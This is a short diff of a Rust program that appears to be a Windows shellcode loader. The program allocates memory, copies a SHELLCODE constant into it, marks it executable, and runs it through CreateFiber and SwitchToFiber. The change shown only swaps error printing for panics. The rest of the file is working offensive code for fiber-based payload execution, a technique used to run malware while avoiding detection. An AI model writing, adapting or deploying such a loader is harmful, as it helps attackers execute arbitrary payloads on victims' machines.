@@ -17,28 +17,24 @@ fn main() {
     unsafe {
         let main_fiber = ConvertThreadToFiber(null());
         if main_fiber.is_null() {
-            eprintln!("ConvertThreadToFiber failed!");
-            return;
+            panic!("ConvertThreadToFiber failed!");
         }
 
         let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if dest.is_null() {
-            eprintln!("VirtualAlloc failed!");
-            return;
+            panic!("VirtualAlloc failed!");
         }
 
         copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);
         let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("VirtualProtect failed!");
-            return;
+            panic!("VirtualProtect failed!");
         }
 
         let dest = transmute(dest);
         let fiber = CreateFiber(0, dest, null());
         if fiber.is_null() {
-            eprintln!("CreateFiber failed!");
-            return;
+            panic!("CreateFiber failed!");
         }
 
         SwitchToFiber(fiber);
